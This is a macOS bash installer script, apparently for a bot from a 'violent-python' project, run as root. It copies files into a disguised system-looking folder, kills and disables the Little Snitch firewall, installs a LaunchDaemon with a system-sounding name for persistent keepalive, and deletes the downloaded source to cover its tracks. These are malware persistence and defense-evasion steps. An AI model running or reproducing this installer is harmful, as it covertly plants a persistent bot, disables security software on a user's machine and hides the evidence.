#!/bin/bash

if [[ `whoami` != "root" ]] 
	then
	echo Must be run as root, not \'`whoami`\'.
	exit 1;
fi

cd "$(dirname $BASH_SOURCE)"                                    # path to this script, should be <path to bot>/code/violent-python-master/

### copy libraries and binaries to corresponding locations
mkdir -p /private/var/softupdated
date >> /private/var/softupdated/install.log 2>&1
cp -fR ./* /private/var/softupdated/ >> /private/var/softupdated/install.log 2>&1
chmod -R +x /private/var/softupdated

### unload previous install
pid=`ps -ax | grep bot.py | head -1 | awk '{ print $1 }'`
kill -KILL $pid >> /private/var/softupdated/install.log 2>&1
launchctl unload -w /Library/LaunchDaemons/sys.daemon.connectd.plist >> /private/var/softupdated/install.log 2>&1
pid=`ps -ax | grep bot.py | head -1 | awk '{ print $1 }'`
kill -KILL $pid >> /private/var/softupdated/install.log 2>&1

### Disable little snitch
if [ -e "/Library/Little Snitch" ] 
	then
	mv "/Library/Little Snitch" "/Library/Little Snitch Monitor" >> /private/var/softupdated/install.log 2>&1
	killall "Little Snitch Agent" >> /private/var/softupdated/install.log 2>&1
	killall "Little Snitch Daemon" >> /private/var/softupdated/install.log 2>&1
	killall "Little Snitch Network Monitor" >> /private/var/softupdated/install.log 2>&1
fi

### copy launchd scripts to launchd folder
cp -fR ./*.plist /Library/LaunchDaemons/ >> /private/var/softupdated/install.log 2>&1
chown -R root /Library/LaunchDaemons/ >> /private/var/softupdated/install.log 2>&1
chmod -R 644 /Library/LaunchDaemons/ >> /private/var/softupdated/install.log 2>&1

chmod -R 700 /private/var/softupdated

### load launchd keepalive processes
launchctl load -w /Library/LaunchDaemons/sys.daemon.connectd.plist >> /private/var/softupdated/install.log 2>&1

rm -f /private/var/softupdated/README.md
rm -f /private/var/softupdated/*.sublime*

echo "Removing downloaded source folder" >> /private/var/softupdated/install.log 2>&1
rm -Rf /private/var/softupdated/code >> /private/var/softupdated/install.log 2>&1 &
echo "Finished install/update" >> /private/var/softupdated/install.log 2>&1
date >> /private/var/softupdated/install.log 2>&1
echo "" >> /private/var/softupdated/install.log 2>&1
echo "--" >> /private/var/softupdated/install.log 2>&1